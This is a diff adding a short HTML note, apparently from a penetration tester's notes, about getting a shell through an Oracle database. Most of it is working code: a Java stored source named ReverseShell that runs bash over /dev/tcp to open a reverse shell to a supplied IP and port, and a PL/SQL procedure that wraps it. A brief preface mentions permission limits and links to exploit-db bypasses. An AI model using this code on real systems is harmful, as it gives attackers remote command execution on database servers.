@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Oracle</title>
+</head><body>This approach will not work as the Oracle JVM implements fine grain policy-based security to control access to the OS and filesystem.  Executing this procedure from a low-permissioned account results in errors. (some old database bypasses are <a href="https://www.exploit-db.com/exploits/33601/">available</a>&nbsp;however)<br/>
+<br/>
+SET scan off<br/>
+&nbsp;<br/>
+create or replace and compile java source named ReverseShell as<br/>
+import java.io.*;<br/>
+public class ReverseShell{<br/>
+&nbsp; &nbsp;public static void getConnection(String ip, String port) throws InterruptedException, IOException{<br/>
+&nbsp; &nbsp; &nbsp; Runtime r = Runtime.getRuntime();<br/>
+&nbsp; &nbsp; &nbsp; Process p = r.exec(new String[]{"/bin/bash","-c","0&lt;&amp;126-;exec 126&lt;&gt;/dev/tcp/" + ip + "/" + port + ";/bin/bash &lt;&amp;126 &gt;&amp;126 2&gt;&amp;126"});<br/>
+&nbsp; &nbsp; &nbsp; System.out.println(p.toString());<br/>
+&nbsp; &nbsp; &nbsp; p.waitFor();<br/>
+&nbsp; &nbsp;}<br/>
+}<br/>
+/<br/>
+&nbsp;<br/>
+create or replace procedure reverse_shell (p_ip IN VARCHAR2,p_port IN VARCHAR2)<br/>
+IS language java name 'ReverseShell.getConnection(java.lang.String, java.lang.String)';</body></html>
